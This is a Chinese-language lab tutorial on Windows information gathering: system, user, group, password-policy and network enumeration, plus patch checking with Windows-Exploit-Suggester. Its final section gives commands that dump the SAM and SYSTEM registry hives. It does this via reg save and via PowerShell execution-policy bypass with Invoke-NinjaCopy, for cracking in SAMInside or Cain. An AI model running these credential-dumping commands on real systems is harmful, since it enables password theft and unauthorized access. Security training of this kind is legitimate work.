# Windows下信息收集

### Windows下信息收集实验 <a id="windows-"></a>

#### 基础信息收集 <a id="-"></a>

**使用systeminfo命令查看操作系统版本、架构、补丁情况**

![](https://p408.ssl.qhimgs4.com/t01687daadb35f5db80.png)

**Windows-Exploit-Suggester-master**

-u 参数升级并将数据库下载至本地：

![](https://p408.ssl.qhimgs4.com/t01a6092dd640a991b8.png)

-i 参数指定系统信息文件；-d 参数指定本地数据库文件，提示需安装xlrd读取Excel文件：

![](https://p408.ssl.qhimgs4.com/t01457fbff6a069205f.png)

pip安装模块：

![](https://p408.ssl.qhimgs4.com/t01eed3cd88b2ba9ad7.png)

再次运行，成功：

![](https://p408.ssl.qhimgs4.com/t01d40fcc7fd6481af2.png)

**使用Whomai、net user查看用户信息**

![](https://p408.ssl.qhimgs4.com/t014a572de2cf6c8e0a.png)

![](https://p408.ssl.qhimgs4.com/t01320b19e6e6c614d2.png)

![](https://p408.ssl.qhimgs4.com/t0117eed146b3e1c27c.png)

**使用net localgroup查看本地用户组**

![](https://p408.ssl.qhimgs4.com/t01d9003f2975c62e0b.png)

**使用net localgroup “组名”来查看用户组信息**

![](https://p408.ssl.qhimgs4.com/t0167601506694a0187.png)

**使用net accounts查看密码策略**

![](https://p408.ssl.qhimgs4.com/t01914afcc3a3181c9a.png)

**使用query user查看最近登录信息**

![](https://p408.ssl.qhimgs4.com/t01315c2fd98edfeff0.png)

**使用ipconfig查看网络适配器信息**

![](https://p408.ssl.qhimgs4.com/t01200aaececb24f420.png)

使用ipconfig /all查看所有适配器

使用ipconfig /displaydns 查看dns缓存

使用net use 查看网络连接

使用netstat查看网络服务

![](https://p408.ssl.qhimgs4.com/t016b80b4507243d5d3.png)

**使用route　print 查看路由信息**

![](https://p408.ssl.qhimgs4.com/t0195e974ed23014899.png)

**使用arp -a 查看arp缓存**

![](https://p408.ssl.qhimgs4.com/t01a81d62ba65f13cd6.png)

#### 凭证收集 <a id="-"></a>

**导出sam数据库中的密码**

方法1：以管理员权限运行cmd,输入以下命令

```text
reg save hklm\sam c:\sam.hive 
reg save hklm\system c:\system.hive 
```

方法2：使用powershell

```text
powershell -exec bypass
Import-Module .\invoke-ninjacopy.ps1
Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
Invoke-NinjaCopy -Path   C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
```

将生成的sam.hive与system.hive转至本地，使用saminside或cain导入

saminside

![](https://p408.ssl.qhimgs4.com/t013a04f0ccfa3830a4.png)

结果如下

![](https://p408.ssl.qhimgs4.com/t01dc98d7a4ce93a67f.png)

cain

![](https://p408.ssl.qhimgs4.com/t012cdaf29e91e807f2.png)

